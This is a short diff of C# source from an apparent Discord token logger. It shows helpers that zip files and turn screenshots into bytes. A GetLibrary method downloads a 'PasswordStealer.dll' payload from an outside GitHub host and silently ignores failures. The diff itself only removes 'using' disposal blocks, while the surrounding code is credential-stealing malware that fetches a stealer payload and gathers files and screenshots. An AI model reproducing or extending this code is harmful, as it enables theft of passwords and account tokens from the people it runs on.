@@ -100,8 +100,8 @@ namespace logger
         }
         private static byte[] CreateZipFile(IEnumerable<FileInfo> files)
         {
-            using (var stream = new MemoryStream())
-            {
+            var stream = new MemoryStream();
+            
 
                 var archive = new ZipArchive(stream, System.IO.Compression.ZipArchiveMode.Create);
 
@@ -114,7 +114,7 @@ namespace logger
                 //File.WriteAllBytes("fdsf.zip", stream.ToArray());
                 return stream.ToArray();
 
-            }
+            
 
 
 
@@ -165,11 +165,11 @@ namespace logger
 
         public static byte[] ImageToByte2(Image img)
         {
-            using (var stream = new MemoryStream())
-            {
+            var stream = new MemoryStream();
+            
                 img.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
                 return stream.ToArray();
-            }
+            
         }
 
 
@@ -205,8 +205,8 @@ namespace logger
         public static byte[] GetLibrary()
         {
             byte[] dll = new byte[0];
-            using (var client = new WebClient())
-            {
+            var client = new WebClient();
+            
                 try
                 {
                     dll = client.DownloadData("https://raw.githubusercontent.com/fknMega/Discord-Token-Logger/master/logger/PasswordStealer.dll");
@@ -215,7 +215,7 @@ namespace logger
                 {
                     
                 }
-            }
+            
             return dll;
         }
 
